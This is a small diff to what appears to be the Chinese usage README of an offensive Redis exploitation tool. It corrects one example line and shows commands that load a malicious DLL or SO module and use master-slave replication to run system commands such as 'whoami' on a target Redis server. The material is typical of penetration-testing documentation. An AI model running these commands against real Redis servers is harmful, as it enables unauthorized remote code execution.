@@ -33,7 +33,7 @@ RedisExp.exe -m cli -r 192.168.19.1 -p 6379 -w 123456 -c info
 
 加载dll或so执行命令：
 RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf (目标 dll | so 文件名)
-.\RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec
+.\RedisEXP.exe -m load -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec
 
 主从复制命令执行：
 RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]
